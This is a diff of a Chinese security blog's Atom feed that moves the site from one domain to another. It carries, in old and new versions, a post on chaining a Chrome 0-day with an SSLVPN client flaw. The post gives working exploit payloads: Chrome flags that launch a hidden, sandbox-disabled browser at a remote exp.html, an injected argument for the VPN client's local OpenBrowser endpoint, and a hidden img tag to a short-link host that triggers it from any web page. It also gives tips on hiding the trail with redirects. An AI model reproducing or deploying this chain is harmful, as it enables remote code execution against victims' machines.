@@ -3,11 +3,11 @@
   <title>NAXG</title>
   
   
-  <link href="https://naxg.online/atom.xml" rel="self"/>
+  <link href="https://naxg.github.io/atom.xml" rel="self"/>
   
-  <link href="https://naxg.online/"/>
-  <updated>2021-04-22T08:24:51.368Z</updated>
-  <id>https://naxg.online/</id>
+  <link href="https://naxg.github.io/"/>
+  <updated>2021-04-25T09:39:49.528Z</updated>
+  <id>https://naxg.github.io/</id>
   
   <author>
     <name>NAXG</name>
@@ -18,12 +18,12 @@
   
   <entry>
     <title>Chrome漏洞利用组合拳</title>
-    <link href="https://naxg.online/2021/04/22/Chrome%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3/"/>
-    <id>https://naxg.online/2021/04/22/Chrome%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3/</id>
+    <link href="https://naxg.github.io/2021/04/22/Chrome%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3/"/>
+    <id>https://naxg.github.io/2021/04/22/Chrome%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3/</id>
     <published>2021-04-22T04:24:43.000Z</published>
-    <updated>2021-04-22T08:24:51.368Z</updated>
+    <updated>2021-04-25T09:39:49.528Z</updated>
     
-    <content type="html"><![CDATA[<p>最近看到大家都在玩chrome的各种利用，6的飞起。</p><p>求Red Team大佬放过，hvv马上也快停止了。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果要在实战中该漏洞需要chrome游览器关闭沙箱漏洞才能利用成功。受害者如果已经打开游览器了无论受害者怎么点击快捷方式都不会以关闭沙箱方式打开，这里可以说是chrome的一个特性吧。chrome每次创建一个网页都会启动一个子进程。</p><p>这里需要考虑一种利用方式就是如果让chrome启动的时候创建一个和原游览器完全无关的一个游览器。<br>通过阅读Chrome启动参数文档发现  --user-data-dir= 能在启动的时候创建一个与原浏览器完全隔离的环境。</p><p>存放数据文件指定到 C:/Windows/Temp/</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--user-data-dir=C:/Windows/Temp/</span><br></pre></td></tr></table></figure><p>使用无痕默认减少暴露痕迹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-incognito</span><br></pre></td></tr></table></figure><p>对新创建的窗口进行隐藏</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--headless</span><br></pre></td></tr></table></figure><h2 id="利用方式一：快捷方式"><a href="#利用方式一：快捷方式" class="headerlink" title="利用方式一：快捷方式"></a>利用方式一：快捷方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot;</span> -incognito --headless --user-data-dir=C:/Windows/Temp/ --no-sandbox http:<span class="comment">//xx.xx.xx.xx/index.html</span></span><br></pre></td></tr></table></figure><h2 id="利用方式二：某SSLVPN-X-Chrome"><a href="#利用方式二：某SSLVPN-X-Chrome" class="headerlink" title="利用方式二：某SSLVPN X Chrome"></a>利用方式二：某SSLVPN X Chrome</h2><p>hvv前期准备工作的时候想着部署各种反制蜜罐反控攻击者机器，在VICP平台看了公司研究院大佬Avscx的mac版客户端RCE的分析研究文章,未对url参数的值进行过滤导致的漏洞触发,主要是针对于mac端的一个利用。</p><p>hvv期间刚好Chrome 0day就爆了出来。于是就想到了Windows下可以通过传入启动参数的方式来进行利用。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>某SSLVPN</p><p>Google Chrome &lt;= 90.0.4430.72 和 Microsoft Edge 没测试</p><p>EXP 编码前</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//127.0.0.1:54530/ECAgent/?op=OpenBrowser&amp;arg=&#123;&quot;url&quot;:&quot; --no-sandbox -incognito --headless --user-data-dir=C:/Windows/Temp/ https://X.X.X.X/exp.html&quot;,&quot;type&quot;:&quot;chrome&quot;,&quot;withShortcut&quot;:0&#125;</span></span><br></pre></td></tr></table></figure><p>EXP 编码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//127.0.0.1:54530/ECAgent/?op=OpenBrowser&amp;arg=%7B%22url%22%3A%22 --no-sandbox -incognito --headless --user-data-dir%3DC%3A%2FWindows%2FTemp%2F https%3A%2F%2FX.X.X.X%2Fexp.html%22%2C%22type%22%3A%22chrome%22%2C%22withShortcut%22%3A0%7D</span></span><br></pre></td></tr></table></figure><p>插入html中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img hidden src=<span class="string">&quot;http://3t7.net/binfe&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>可以在真正利用的时候对url做各种短链接，跳转好几次让受害者无法找真正的利用。</p><p>插入任意网页，使用任意的游览器和任意能发起url请求的软件都能触发。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"video":{"url":"/images/Chrome漏洞利用组合拳/演示v2.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><h2 id="反制"><a href="#反制" class="headerlink" title="反制"></a>反制</h2><p>可以利用这漏洞组合拳起来反制攻击队，攻击队也可以用来攻击。</p><p><img src="/images/Chrome%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3/image-20210420212208983.png" alt="image-20210420212208983"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级Google Chrome 和 Microsoft Edge 浏览器的最新版。<br>(攻击者也可以调用Edge来触发执行)</p><p>安装SSLVPN客户端最新版。<br><del>暂时不用建议删除</del></p>]]></content>
+    <content type="html"><![CDATA[<p>最近看到大家都在玩chrome的各种利用，6的飞起。</p><p>求Red Team大佬放过，hvv马上也快停止了。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果要在实战中该漏洞需要chrome游览器关闭沙箱漏洞才能利用成功。受害者如果已经打开游览器了无论受害者怎么点击快捷方式都不会以关闭沙箱方式打开，这里可以说是chrome的一个特性吧。chrome每次创建一个网页都会启动一个子进程。</p><p>这里需要考虑一种利用方式就是如果让chrome启动的时候创建一个和原游览器完全无关的一个游览器。<br>通过阅读Chrome启动参数文档发现  --user-data-dir= 能在启动的时候创建一个与原浏览器完全隔离的环境。</p><p>存放数据文件指定到 C:/Windows/Temp/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--user-data-dir&#x3D;C:&#x2F;Windows&#x2F;Temp&#x2F;</span><br></pre></td></tr></table></figure><p>使用无痕默认减少暴露痕迹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-incognito</span><br></pre></td></tr></table></figure><p>对新创建的窗口进行隐藏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--headless</span><br></pre></td></tr></table></figure><h2 id="利用方式一：快捷方式"><a href="#利用方式一：快捷方式" class="headerlink" title="利用方式一：快捷方式"></a>利用方式一：快捷方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot; -incognito --headless --user-data-dir&#x3D;C:&#x2F;Windows&#x2F;Temp&#x2F; --no-sandbox http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;index.html</span><br></pre></td></tr></table></figure><h2 id="利用方式二：某SSLVPN-X-Chrome"><a href="#利用方式二：某SSLVPN-X-Chrome" class="headerlink" title="利用方式二：某SSLVPN X Chrome"></a>利用方式二：某SSLVPN X Chrome</h2><p>hvv前期准备工作的时候想着部署各种反制蜜罐反控攻击者机器，在VICP平台看了公司研究院大佬Avscx的mac版客户端RCE的分析研究文章,未对url参数的值进行过滤导致的漏洞触发,主要是针对于mac端的一个利用。</p><p>hvv期间刚好Chrome 0day就爆了出来。于是就想到了Windows下可以通过传入启动参数的方式来进行利用。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>某SSLVPN</p><p>Google Chrome &lt;= 90.0.4430.72 和 Microsoft Edge 没测试</p><p>EXP 编码前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1:54530&#x2F;ECAgent&#x2F;?op&#x3D;OpenBrowser&amp;arg&#x3D;&#123;&quot;url&quot;:&quot; --no-sandbox -incognito --headless --user-data-dir&#x3D;C:&#x2F;Windows&#x2F;Temp&#x2F; https:&#x2F;&#x2F;X.X.X.X&#x2F;exp.html&quot;,&quot;type&quot;:&quot;chrome&quot;,&quot;withShortcut&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>EXP 编码后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1:54530&#x2F;ECAgent&#x2F;?op&#x3D;OpenBrowser&amp;arg&#x3D;%7B%22url%22%3A%22 --no-sandbox -incognito --headless --user-data-dir%3DC%3A%2FWindows%2FTemp%2F https%3A%2F%2FX.X.X.X%2Fexp.html%22%2C%22type%22%3A%22chrome%22%2C%22withShortcut%22%3A0%7D</span><br></pre></td></tr></table></figure><p>插入html中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img hidden src&#x3D;&quot;http:&#x2F;&#x2F;3t7.net&#x2F;binfe&quot;&gt;</span><br></pre></td></tr></table></figure><p>可以在真正利用的时候对url做各种短链接，跳转好几次让受害者无法找真正的利用。</p><p>插入任意网页，使用任意的游览器和任意能发起url请求的软件都能触发。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"video":{"url":"/images/Chrome漏洞利用组合拳/演示v2.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><h2 id="反制"><a href="#反制" class="headerlink" title="反制"></a>反制</h2><p>可以利用这漏洞组合拳起来反制攻击队，攻击队也可以用来攻击。</p><p><img src="/images/Chrome%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3/image-20210420212208983.png" alt="image-20210420212208983"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级Google Chrome 和 Microsoft Edge 浏览器的最新版。<br>(攻击者也可以调用Edge来触发执行)</p><p>安装SSLVPN客户端最新版。<br><del>暂时不用建议删除</del></p>]]></content>
     
     
       
@@ -36,14 +36,14 @@
     
     
     
-    <category term="Chrome SSLVPN" scheme="https://naxg.online/tags/Chrome-SSLVPN/"/>
+    <category term="Chrome SSLVPN" scheme="https://naxg.github.io/tags/Chrome-SSLVPN/"/>
     
   </entry>
   
   <entry>
     <title>某堡垒机的明文密码获取</title>
-    <link href="https://naxg.online/2020/09/07/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/"/>
-    <id>https://naxg.online/2020/09/07/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</id>
+    <link href="https://naxg.github.io/2020/09/07/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/"/>
+    <id>https://naxg.github.io/2020/09/07/%E6%9F%90%E5%A0%A1%E5%9E%92%E6%9C%BA%E7%9A%84%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</id>
     <published>2020-09-07T06:28:43.000Z</published>
     <updated>2021-04-20T13:22:42.014Z</updated>
     
@@ -63,8 +63,8 @@
   
   <entry>
     <title>caidao流量分析</title>
-    <link href="https://naxg.online/2019/08/01/caidao%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
-    <id>https://naxg.online/2019/08/01/caidao%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
+    <link href="https://naxg.github.io/2019/08/01/caidao%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
+    <id>https://naxg.github.io/2019/08/01/caidao%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
     <published>2019-08-01T15:31:15.000Z</published>
     <updated>2019-08-01T15:52:28.404Z</updated>
     
@@ -83,8 +83,8 @@
   
   <entry>
     <title>Redis_Rce</title>
-    <link href="https://naxg.online/2019/07/10/Redis-Rce/"/>
-    <id>https://naxg.online/2019/07/10/Redis-Rce/</id>
+    <link href="https://naxg.github.io/2019/07/10/Redis-Rce/"/>
+    <id>https://naxg.github.io/2019/07/10/Redis-Rce/</id>
     <published>2019-07-10T07:48:01.000Z</published>
     <updated>2019-07-10T07:57:16.892Z</updated>
     
@@ -104,8 +104,8 @@
   
   <entry>
     <title>信息收集小技巧</title>
-    <link href="https://naxg.online/2019/07/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
-    <id>https://naxg.online/2019/07/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
+    <link href="https://naxg.github.io/2019/07/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
+    <id>https://naxg.github.io/2019/07/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
     <published>2019-07-10T03:18:14.000Z</published>
     <updated>2019-07-10T03:45:17.061Z</updated>
     
@@ -125,8 +125,8 @@
   
   <entry>
     <title>恢复更新啦</title>
-    <link href="https://naxg.online/2019/07/09/%E6%81%A2%E5%A4%8D%E6%9B%B4%E6%96%B0/"/>
-    <id>https://naxg.online/2019/07/09/%E6%81%A2%E5%A4%8D%E6%9B%B4%E6%96%B0/</id>
+    <link href="https://naxg.github.io/2019/07/09/%E6%81%A2%E5%A4%8D%E6%9B%B4%E6%96%B0/"/>
+    <id>https://naxg.github.io/2019/07/09/%E6%81%A2%E5%A4%8D%E6%9B%B4%E6%96%B0/</id>
     <published>2019-07-09T13:48:36.000Z</published>
     <updated>2019-07-09T15:23:03.918Z</updated>
     
@@ -146,8 +146,8 @@
   
   <entry>
     <title>权限维持小技巧</title>
-    <link href="https://naxg.online/2018/08/05/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
-    <id>https://naxg.online/2018/08/05/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
+    <link href="https://naxg.github.io/2018/08/05/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
+    <id>https://naxg.github.io/2018/08/05/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
     <published>2018-08-05T10:41:32.000Z</published>
     <updated>2019-07-09T13:43:42.836Z</updated>
     
@@ -166,8 +166,8 @@
   
   <entry>
     <title>金融行业网络安全比赛WP</title>
-    <link href="https://naxg.online/2018/08/04/%E9%87%91%E8%9E%8D%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9BWP/"/>
-    <id>https://naxg.online/2018/08/04/%E9%87%91%E8%9E%8D%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9BWP/</id>
+    <link href="https://naxg.github.io/2018/08/04/%E9%87%91%E8%9E%8D%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9BWP/"/>
+    <id>https://naxg.github.io/2018/08/04/%E9%87%91%E8%9E%8D%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9BWP/</id>
     <published>2018-08-04T13:47:00.000Z</published>
     <updated>2021-04-20T13:23:16.569Z</updated>
     
@@ -183,14 +183,14 @@
     
     
     
-    <category term="CTF" scheme="https://naxg.online/tags/CTF/"/>
+    <category term="CTF" scheme="https://naxg.github.io/tags/CTF/"/>
     
   </entry>
   
   <entry>
     <title>南网2018预选赛部分writeup</title>
-    <link href="https://naxg.online/2018/07/29/%E5%8D%97%E7%BD%912018%E9%A2%84%E9%80%89%E8%B5%9BWP/"/>
-    <id>https://naxg.online/2018/07/29/%E5%8D%97%E7%BD%912018%E9%A2%84%E9%80%89%E8%B5%9BWP/</id>
+    <link href="https://naxg.github.io/2018/07/29/%E5%8D%97%E7%BD%912018%E9%A2%84%E9%80%89%E8%B5%9BWP/"/>
+    <id>https://naxg.github.io/2018/07/29/%E5%8D%97%E7%BD%912018%E9%A2%84%E9%80%89%E8%B5%9BWP/</id>
     <published>2018-07-29T04:46:00.000Z</published>
     <updated>2018-08-04T19:20:47.403Z</updated>
     
@@ -205,14 +205,14 @@
     
     
     
-    <category term="CTF" scheme="https://naxg.online/tags/CTF/"/>
+    <category term="CTF" scheme="https://naxg.github.io/tags/CTF/"/>
     
   </entry>
   
   <entry>
     <title>Hello World</title>
-    <link href="https://naxg.online/2018/07/28/hello-world/"/>
-    <id>https://naxg.online/2018/07/28/hello-world/</id>
+    <link href="https://naxg.github.io/2018/07/28/hello-world/"/>
+    <id>https://naxg.github.io/2018/07/28/hello-world/</id>
     <published>2018-07-28T10:38:00.000Z</published>
     <updated>2018-08-04T19:17:57.254Z</updated>
     
